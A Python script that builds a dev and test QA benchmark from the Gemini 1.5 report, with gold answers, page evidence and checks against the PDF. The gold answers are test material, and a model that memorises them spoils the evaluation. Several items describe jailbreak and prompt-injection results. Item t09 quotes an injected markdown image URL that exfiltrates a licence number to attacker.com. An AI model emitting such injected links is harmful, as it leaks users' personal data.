"""Build the advanced-challenge benchmark (Gemini 1.5 report, 154 pages) and verify it against the ORIGINAL PDF.

Run with the PyMuPDF venv from the Day 7 root:
  adv/.venv-extract/Scripts/python.exe -W ignore adv/build_benchmark_adv.py

Gold lives only in adv/benchmark.json and must never reach the retriever/agent.
Checks performed here (so the gold is not just "what the vision model said"):
  * every `text_evidence` string must occur in the PDF text layer of the stated page;
  * every `cells` list must occur, in order, in the text layer of the stated page (tables);
  * every `calc` expression is evaluated and must equal the stated number;
  * `visual_only` evidence (raster text, chart labels) was read by the author on the rendered page image
    (adv/out/view/pNNN.png) and is flagged verified_by = "page-image";
  * unanswerable questions: none of their terms may occur anywhere in the text layer or in the vision-model output.
"""
import json
import re
import sys
from pathlib import Path

import pymupdf

ROOT = Path(__file__).resolve().parents[1]
PDF = ROOT / 'adv/data/gemini15.pdf'
SRC = 'gemini15'

# kind: table | figure (image/diagram) | chart | text ; cat: table | image | chart | multihop | text
Q = [
    # ------------------------------------------------------------------ DEV (15 answerable)
    dict(id='d01', split='dev', cat='table', question='How many milliseconds per output character does Gemini 1.5 Pro take for Japanese in the table comparing API latency across languages?',
         answer='10.9 ms', gold=[dict(page=6, kind='table', label='Table 3', region='row Japanese, column Gemini 1.5 Pro', cells=['Japanese', '4.3', '10.9'])]),
    dict(id='d02', split='dev', cat='table', question='By how many percentage points is the word error rate of Gemini 1.5 Pro on 15-minute videos lower than that of USM?',
         answer='3.3 percentage points (5.5% vs 8.8%)', calc=('8.8-5.5', 3.3),
         gold=[dict(page=23, kind='table', label='Table 8', region='row WER, columns USM and Gemini 1.5 Pro', cells=['8.8%', '12.5%', '7.3%', '100%', '7.8%', '5.5%'])]),
    dict(id='d03', split='dev', cat='table', question='In the offensive cybersecurity table, how many more InterCode-CTF challenges did Gemini 1.5 Pro solve than Gemini 1.0 Ultra?',
         answer='15 more (43/81 vs 28/81)', calc=('43-28', 15),
         gold=[dict(page=69, kind='table', label='Table 38', region='column InterCode-CTF, rows Gemini 1.0 Ultra and Gemini 1.5 Pro', cells=['28/81 (35%)', '3/13 (23%)', '0/13', '43/81 (53%)'])]),
    dict(id='d04', split='dev', cat='table', question='In the Money Talks persuasion evaluation, how much higher is the mean donation obtained with Gemini 1.5 Pro than with no chatbot?',
         answer='GBP 0.84 (3.45 vs 2.61)', calc=('3.45-2.61', 0.84),
         gold=[dict(page=71, kind='table', label='Table 43', region='column Mean amount donated, rows Gemini 1.5 Pro and No chatbot', cells=['3.45', '2.61'])]),
    dict(id='d05', split='dev', cat='image', question='In the figure where Gemini 1.5 Pro finds the backward pass for autodifferentiation in JAX, how many total files does the JAX core codebase contain?',
         answer='116 files', gold=[dict(page=8, kind='figure', label='Figure 3', region='left panel "JAX Core Codebase: Tokens 746,152 tokens, Total files: 116"', visual_only='Total files: 116')]),
    dict(id='d06', split='dev', cat='image', question='In the Sherlock Jr. video example, at which timecode does the model say the pawn ticket is removed from the person\'s pocket?',
         answer='12:01', gold=[dict(page=9, kind='figure', label='Figure 6', region='model output of the first prompt: "This moment occurs at timecode 12:01"', visual_only='12:01')]),
    dict(id='d07', split='dev', cat='image', question='In the AlphaGo video frame used as the needle example, what does the text overlay at the top of the frame say the secret word is?',
         answer='"needle" (overlay: The secret word is "needle".)', gold=[dict(page=110, kind='figure', label='Figure 28', region='top subtitle of the video frame', visual_only='The secret word is "needle".')]),
    dict(id='d08', split='dev', cat='chart', question='In the chart of time saved per industry, which industry has the highest value for Gemini 1.5 Pro, and what is that value?',
         answer='Programming, 0.75', gold=[dict(page=38, kind='chart', label='Figure 19', region='bar chart: green bars (Gemini 1.5 Pro); tallest = Programming labelled 0.75', visual_only='0.75')]),
    dict(id='d09', split='dev', cat='chart', question='In the chart titled "Accuracy on all the attributes extraction", at which batch size does the line for Claude 3 Opus end?',
         answer='Batch size 16', gold=[dict(page=28, kind='chart', label='Figure 17', region='green line (Claude 3 Opus) spans batch sizes 8 and 16 only', visual_only='Claude 3 Opus line ends at 16',
                                         text_evidence=['Claude 3 API is not able to analyze more than 20 images'])]),
    dict(id='d10', split='dev', cat='chart', question='In the BlocksWorld planning chart, which model has a planning accuracy close to zero with one few-shot exemplar?',
         answer='GPT-4 Turbo', gold=[dict(page=26, kind='chart', label='Figure 16(a)', region='BlocksWorld plot, blue line starts at 0% accuracy at 1 exemplar', visual_only='GPT-4 Turbo starts near 0',
                                        text_evidence=['GPT-4 Turbo performance is close to zero'])]),
    dict(id='d11', split='dev', cat='multihop', question='Which input is larger, the JAX codebase in the code-location example or the Sherlock Jr. movie in the video example, and by roughly how many tokens?',
         answer='The JAX codebase (746,152 tokens) is larger than the movie (684K tokens) by roughly 62K tokens', calc=('746152-684000', 62152),
         gold=[dict(page=8, kind='figure', label='Figure 3', region='caption/panel: 746,152 tokens', text_evidence=['746,152 token JAX codebase']),
               dict(page=9, kind='figure', label='Figure 6', region='caption: 684K tokens', text_evidence=['684k tokens'])]),
    dict(id='d12', split='dev', cat='multihop', question='What word error rate does Gemini 1.5 Pro get on 15-minute videos, and what accuracy does it get on 1H-VideoQA when given the full video at 1 frame per second?',
         answer='WER 5.5%; accuracy 72.2%',
         gold=[dict(page=23, kind='table', label='Table 8', region='WER row, Gemini 1.5 Pro', cells=['5.5%']),
               dict(page=25, kind='table', label='Table 9', region='Gemini 1.5 Pro row, full video (1 fps)', cells=['Gemini 1.5 Pro', '45.2%', '56.3%', '72.2%'])]),
    dict(id='d13', split='dev', cat='text', question='How many questions does the 1H-VideoQA benchmark contain, what format are they in, and how long are the videos?',
         answer='125 five-way multiple-choice questions over public videos 40-105 minutes long',
         gold=[dict(page=24, kind='text', region='section 5.2.2.6', text_evidence=['composed of 125 five-way multiple-choice questions over public videos 40-105 minutes long'])]),
    dict(id='d14', split='dev', cat='text', question='How much does Gemini 1.5 Pro improve accuracy on all-attributes extraction over GPT-4 Turbo, and why are the Claude 3 Opus results capped?',
         answer='9% absolute (27% relative); the Claude 3 API could not analyze more than 20 images',
         gold=[dict(page=28, kind='text', region='section 5.2.2.8 bullet list', text_evidence=['improved by 9% (absolute) or 27%', 'not able to analyze more than 20 images'])]),
    dict(id='d15', split='dev', cat='text', question='From which model is Gemini 1.5 Flash online distilled, and what context length does it share with Gemini 1.5 Pro?',
         answer='Online distilled from the much larger Gemini 1.5 Pro; same 2M+ context',
         gold=[dict(page=6, kind='text', region='section 3.2', text_evidence=['same 2M+ context', 'from the much larger Gemini 1.5 Pro model'])]),
    # ------------------------------------------------------------------ TEST (24 answerable)
    dict(id='t01', split='test', cat='table', question='In the function-calling results, by how many percentage points does Gemini 1.5 Pro beat Gemini 1.5 Flash on Parallel Functions?',
         answer='15.0 points (88.5% vs 73.5%)', calc=('88.5-73.5', 15.0),
         gold=[dict(page=33, kind='table', label='Table 12', region='row Parallel Functions', cells=['Parallel Functions', '38.5%', '73.5%', '88.5%'])]),
    dict(id='t02', split='test', cat='table', question='On HiddenMath, which of Gemini 1.5 Pro, Claude 3 Opus and GPT-4 Turbo (excluding the math-specialized model) scores highest, and what is its score?',
         answer='GPT-4 Turbo, 24.6', gold=[dict(page=43, kind='table', label='Table 21', region='row HiddenMath', cells=['HiddenMath', '20.1', '35.2', '17.3', '24.6'])]),
    dict(id='t03', split='test', cat='table', question='In the Charm Offensive study, by how many percentage points does Gemini 1.5 Pro exceed Gemini 1.0 Ultra on the "Funny" rating?',
         answer='31 points (69% vs 38%)', calc=('69-38', 31),
         gold=[dict(page=70, kind='table', label='Table 41', region='column Funny, rows Gemini 1.0 Ultra and Gemini 1.5 Pro', cells=['69%', '65%', '38%', '65%', '86%', '63%', '74%', '82%', '70%', '69%', '81%', '95%', '69%', '90%'])]),
    dict(id='t04', split='test', cat='table', question='In the WMT23 BLEURT results, is Gemini 1.5 Pro higher on the High-resource or the Mid-resource group, and by how much?',
         answer='Mid-resource is higher by 1.01 (75.76 vs 74.75)', calc=('75.76-74.75', 1.01),
         gold=[dict(page=109, kind='table', label='Table 46', region='WMT23 rows High and Mid, column Gemini 1.5 Pro', cells=['74.75', '75.76'])]),
    dict(id='t05', split='test', cat='table', question='In the jailbreak results table, which attack on Gemini 1.5 Pro needs zero queries, and what is its gain over Gemini 1.0 Ultra?',
         answer='The Template attack (blackbox); -51% relative to Gemini 1.0 Ultra',
         gold=[dict(page=55, kind='table', label='Table 26', region='Gemini 1.5 Pro / Template / Blackbox / 0 queries', cells=['Template', 'Blackbox', '0', '51%'])]),
    dict(id='t06', split='test', cat='table', question='For Kalamang-to-English translation with the full book in context, by how many points (0-6 scale) does the human language learner outscore Gemini 1.5 Pro?',
         answer='1.52 points (5.52 vs 4.00)', calc=('5.52-4.00', 1.52),
         gold=[dict(page=149, kind='table', label='Table 55', region='row full book, columns Gemini 1.5 Pro and Human language learner', cells=['4.00', '5.52'])]),
    dict(id='t07', split='test', cat='image', question='In the Kalamang translation example, how many tokens do the grammar book and dictionary take together?',
         answer='250K tokens', gold=[dict(page=8, kind='figure', label='Figure 4', region='long-context panel: "250K tokens"', visual_only='250K tokens')]),
    dict(id='t08', split='test', cat='image', question='In the Les Miserables hand-drawn sketch example, which page does the model say the scene is on?',
         answer='Page 119', gold=[dict(page=8, kind='figure', label='Figure 5', region='model output: "This is on page 119"', visual_only='This is on page 119')]),
    dict(id='t09', split='test', cat='image', question='In the prompt-injection illustration, what value does the injected markdown image URL send to the attacker as the parameter?',
         answer='K1455236 (the driver\'s license number)', gold=[dict(page=61, kind='figure', label='Figure 23', region='successful response: ![resort](https://attacker.com/img.jpg?param=K1455236)', visual_only='K1455236')]),
    dict(id='t10', split='test', cat='image', question='In the ChemicalDiagramQA example for the full figure, which part of the chemical structure does the question ask to count oxygen atoms in?',
         answer='The MNIO part', gold=[dict(page=139, kind='figure', label='Figure 30', region='Full Figure panel question: "How many oxygen atoms are in MNIO part of the chemical structure?"', visual_only='MNIO')]),
    dict(id='t11', split='test', cat='image', question='In the BetterChartQA flowchart example, what is the ground-truth answer to which step builds the MySQL based relational database?',
         answer='Preprocessing Step', gold=[dict(page=149, kind='figure', label='Figure 31', region='flowchart panel: Ground truth: Preprocessing Step', visual_only='Preprocessing Step')]),
    dict(id='t12', split='test', cat='chart', question='In the chart comparing Gemini 1.5 Pro (Feb vs May 2024), which benchmark shows the largest improvement and how large is it?',
         answer='V* Bench, +23.7 points (48.0 to 71.7)', calc=('71.7-48.0', 23.7),
         gold=[dict(page=5, kind='chart', label='Figure 2', region='bar V* Bench: 48.0 -> 71.7 (+23.7)', visual_only='+23.7')]),
    dict(id='t13', split='test', cat='chart', question='In the Expertise QA chart, what "severely inaccurate" rate does Gemini 1.5 Pro have compared with Gemini 1.0 Pro?',
         answer='6.3% for Gemini 1.5 Pro vs 26.7% for Gemini 1.0 Pro', gold=[dict(page=35, kind='chart', label='Figure 18', region='group Severely Inaccurate: 1.0 Pro 26.7%, 1.5 Pro 6.3%', visual_only='6.3% / 26.7%')]),
    dict(id='t14', split='test', cat='chart', question='In the haystack recall figure, for which modality do unsuccessful (red) retrievals appear?',
         answer='Only the text haystack', gold=[dict(page=2, kind='chart', label='Figure 1', region='Text Haystack panel has red cells; Video and Audio panels are all green', visual_only='red cells only in Text')]),
    dict(id='t15', split='test', cat='chart', question='In the personal-data memorization chart, which model has the lowest memorization rate for personal data?',
         answer='Gemini 1.5 Pro', gold=[dict(page=64, kind='chart', label='Figure 25', region='red ("Personal? Yes") bars: Gemini 1.5 Pro lowest', visual_only='Gemini 1.5 Pro lowest')]),
    dict(id='t16', split='test', cat='chart', question='In the relative attack success rate vs number of queries chart, which attack setting is highest at 60,000 queries?',
         answer='Greybox on Gemini 1.5 Flash (about +12%)', gold=[dict(page=56, kind='chart', label='Figure 21', region='red dashed line with triangles ends highest (about 12) at 60000 queries', visual_only='Greybox on Gemini 1.5 Flash highest')]),
    dict(id='t17', split='test', cat='multihop', question='Which book is longer, War and Peace as described in the architecture section or Les Miserables as used in the sketch example, and by how many pages?',
         answer='War and Peace (1440 pages) is longer than Les Miserables (1382 pages) by 58 pages', calc=('1440-1382', 58),
         gold=[dict(page=6, kind='text', region='section 3.1', text_evidence=['1440 page book']), dict(page=8, kind='figure', label='Figure 5', region='caption: 1382 pages', text_evidence=['1382 pages'])]),
    dict(id='t18', split='test', cat='multihop', question='In the Les Miserables answer-quality comparison, what strength does the full-context Gemini 1.5 Pro get versus the 4k RAG version, and about how many passages does the RAG setup retrieve?',
         answer='6.2417 vs 1.7656; about 41 passages (up to 4k tokens)',
         gold=[dict(page=22, kind='chart', label='Figure 14', region='bars: RAG 4k context Gemini 1.5 Pro 1.7656; full 710k context Gemini 1.5 Pro 6.2417', visual_only='6.2417 and 1.7656'),
               dict(page=22, kind='text', region='paragraph below the figure', text_evidence=['roughly 41 passages'])]),
    dict(id='t19', split='test', cat='multihop', question='How many points higher is the MATH score of Gemini 1.5 Pro in the math-reasoning table than that of Gemini 1.5 Flash in the Flash-8B comparison table?',
         answer='12.8 points (67.7 vs 54.9)', calc=('67.7-54.9', 12.8),
         gold=[dict(page=43, kind='table', label='Table 21', region='row MATH, column Gemini 1.5 Pro', cells=['MATH', '67.7']), dict(page=46, kind='table', label='Table 22', region='MATH row, column Gemini 1.5 Flash', cells=['MATH: Math problems ranging', '35.9%', '54.9%'])]),
    dict(id='t20', split='test', cat='multihop', question='On GPQA, how many points higher is Gemini 1.5 Pro (May 2024, in the improvements chart) than Gemini 1.5 Flash in the Flash-8B comparison table?',
         answer='6.7 points (46.2 vs 39.5)', calc=('46.2-39.5', 6.7),
         gold=[dict(page=5, kind='chart', label='Figure 2', region='GPQA bar May 2024: 46.2', visual_only='46.2'), dict(page=46, kind='table', label='Table 22', region='GPQA row, column Gemini 1.5 Flash', cells=['GPQA: Graduate-Level Google-Proof Q&A.', '30.8%', '39.5%'])]),
    dict(id='t21', split='test', cat='text', question='Relative to Gemini 1.0 Ultra, by how much does Gemini 1.5 Flash increase refusals on ungrounded and on grounded queries?',
         answer='35% on ungrounded and 140% on grounded queries', gold=[dict(page=59, kind='text', region='paragraph about Figure 22', text_evidence=['35/140% increase over Gemini 1.0 Ultra on ungrounded/grounded data'])]),
    dict(id='t22', split='test', cat='text', question='What win-rate does Gemini 1.5 Pro achieve on the Dolomites benchmark, and which model acts as the judge?',
         answer='55.3%, judged by Claude 3 Opus', gold=[dict(page=35, kind='text', region='Domain-Specific Long-Form Methodical Tasks', text_evidence=['Claude 3 Opus as the judge', 'highest win-rate of 55.3%'])]),
    dict(id='t23', split='test', cat='text', question='How is the attack success rate defined in the prompt injection evaluation, and over how many outputs per category?',
         answer='Proportion of the 1500 outputs per category that contain the adversarial target URL', gold=[dict(page=61, kind='text', region='paragraph before Table 32', text_evidence=['proportion of the 1500 outputs per category containing the adversarial target URL'])]),
    dict(id='t24', split='test', cat='text', question='How often do short and long prompts succeed at causing divergence in the training-data extraction attack?',
         answer='Short prompts 35.6% of the time; long prompts 61.5%', gold=[dict(page=64, kind='text', region='memorization section', text_evidence=['short prompts succeed at divergence only 35.6% of the time', 'long prompts succeed at causing divergence 61.5% of the time'])]),
]

# unanswerable: near-topic questions whose subject is absent. terms are scanned in the text layer AND the vision output.
UNANS = [
    dict(id='u01', split='dev', question='How much does the Gemini 1.5 Pro API cost per million input tokens?', terms=['price', 'pricing', 'per million']),
    dict(id='u02', split='dev', question='What is the total number of parameters of Gemini 1.5 Pro?', terms=['billion parameters', 'million parameters', 'trillion parameters'],
         note='The report mentions a "total parameter count" only generically (page 5) and never gives a number.'),
    dict(id='u03', split='dev', question='What score does Gemini 1.5 Pro obtain on the SWE-bench software engineering benchmark?', terms=['swe-bench', 'swe bench']),
    dict(id='u04', split='test', question='What score does Gemini 1.5 Pro obtain on the MMLU-Pro benchmark?', terms=['mmlu-pro', 'mmlu pro']),
    dict(id='u05', split='test', question='How does Gemini 1.5 Pro compare with GPT-4o on the MATH benchmark?', terms=['gpt-4o', 'gpt4o']),
    dict(id='u06', split='test', question='What is the knowledge cutoff date of the training data of Gemini 1.5 Pro?', terms=['knowledge cutoff', 'knowledge cut-off', 'cutoff'],
         note='Pages 31-32 mention "the training data cut-off" only generically (to explain test-set leakage) and never give a date.'),
    dict(id='u07', split='test', question='How many TPU chips were used to train Gemini 1.5 Pro?', terms=['chips', 'tpu v']),
    dict(id='u08', split='test', question='How many tokens per second does Gemini 1.5 Flash generate?', terms=['tokens per second', 'tokens/s', 'tokens/sec'],
         note='Table 3 reports time per output CHARACTER in ms for several APIs, not tokens per second; a conversion would be speculation.'),
    dict(id='u09', split='test', question='What is the energy consumption or carbon footprint of training Gemini 1.5 Pro?', terms=['carbon', 'co2', 'kwh', 'energy consumption', 'power consumption']),
]


def norm(s):
    return re.sub(r'\s+', ' ', s.replace('−', '-').replace('–', '-')).strip()


def main():
    doc = pymupdf.open(PDF)
    pages = {i: doc[i - 1].get_text() for i in range(1, len(doc) + 1)}
    pages_n = {i: norm(t) for i, t in pages.items()}
    vis = json.loads((ROOT / 'adv/out/visual_items.json').read_text(encoding='utf-8'))
    chunks = json.loads((ROOT / 'adv/out/text_chunks.json').read_text(encoding='utf-8'))
    problems, out = [], []
    for q in Q:
        if 'calc' in q:
            expr, expected = q['calc']
            if abs(eval(expr) - expected) > 1e-6:
                problems.append(f"{q['id']}: calc {expr} != {expected}")
        for g in q['gold']:
            g['source_id'] = SRC
            checks = []
            for s in g.get('text_evidence', []):
                ok = norm(s) in pages_n[g['page']]
                checks.append(('text-layer', s, ok))
            if 'cells' in g:  # cells must appear in order in the page's text layer
                pos, ok = 0, True
                t = norm(pages[g['page']].replace('\n', ' | '))
                for c in g['cells']:
                    i = t.find(norm(c), pos)
                    if i < 0:
                        ok = False
                        break
                    pos = i + len(c)
                checks.append(('text-layer-cells', ' | '.join(g['cells']), ok))
            if 'visual_only' in g:
                g['verified_by'] = 'page-image (read by the author on adv/out/view/p%03d.png)' % g['page']
            else:
                g['verified_by'] = 'text-layer'
            for kind, s, ok in checks:
                if not ok:
                    problems.append(f"{q['id']} p{g['page']}: {kind} NOT FOUND: {s[:80]}")
        q['answerable'] = True
        q['source_id'] = SRC
        out.append(q)
    corpus = ' '.join(pages_n.values()).lower() + ' ' + ' '.join(
        norm(it.get('content', '') + ' ' + it.get('caption', '')).lower() for v in vis.values() for it in v.get('items', []))
    for u in UNANS:
        hits = [t for t in u['terms'] if t in corpus]
        if hits:
            problems.append(f"{u['id']}: not unanswerable, found {hits}")
        out.append(dict(id=u['id'], split=u['split'], cat='unanswerable', question=u['question'], answerable=False,
                        expected_behavior='search_and_abstain',
                        absence_reason=('Full-text scan of the PDF text layer (154 pages) and of all vision-extracted table/figure content '
                                        f"(case-insensitive) found none of: {', '.join(repr(t) for t in u['terms'])}. " + u.get('note', '')),
                        source_id=SRC))
    ids = [q['id'] for q in out]
    assert len(ids) == len(set(ids))
    if problems:
        print('\n'.join(problems))
        sys.exit(f'{len(problems)} verification problem(s); benchmark NOT written')
    (ROOT / 'adv/benchmark.json').write_text(json.dumps(out, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
    import collections
    for split in ('dev', 'test'):
        c = collections.Counter(q['cat'] for q in out if q['split'] == split)
        print(split, sum(c.values()), dict(c))


if __name__ == '__main__':
    main()
